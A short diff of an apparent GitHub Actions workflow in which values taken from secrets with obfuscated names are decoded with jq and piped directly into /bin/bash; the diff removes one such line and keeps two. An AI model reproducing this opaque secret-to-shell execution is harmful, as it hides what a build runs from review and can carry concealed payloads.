@@ -23,7 +23,6 @@ jobs:
           xjt35640: ${{ secrets.xjt35640 }}
         run: |
           printf '%s' "$xjt35640" | jq -r .qezb1 | /bin/bash
-          echo $sj7580 | jq -r .u25 | /bin/bash
           echo $qekoo4960 | jq -r .ybm2 | /bin/bash
 
       - name: Save archive
